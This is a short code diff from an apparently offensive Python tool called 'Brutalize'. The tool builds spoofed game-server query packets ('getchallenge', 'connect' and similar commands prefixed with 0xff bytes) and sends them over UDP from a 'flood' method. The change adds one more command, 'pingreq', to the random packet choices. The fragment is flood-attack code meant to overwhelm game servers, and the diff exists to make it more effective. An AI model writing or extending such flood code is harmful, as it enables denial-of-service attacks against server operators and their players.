@@ -21,7 +21,7 @@ class Brutalize:
 
         self.client = socket(family=AF_INET, type=SOCK_DGRAM)
         # self.data = self._randbytes()
-        self.data = str.encode(f'\xff\xff\xff\xff{choice(["getchallenge", "connect", "connectReq"])} "{randint(0,999999999)}" {randint(3000,5000)}')
+        self.data = str.encode(f'\xff\xff\xff\xff{choice(["getchallenge", "connect", "connectReq", "pingreq"])} "{randint(0,999999999)}" {randint(3000,5000)}')
         self.len = len(self.data)
 
     def flood(self):
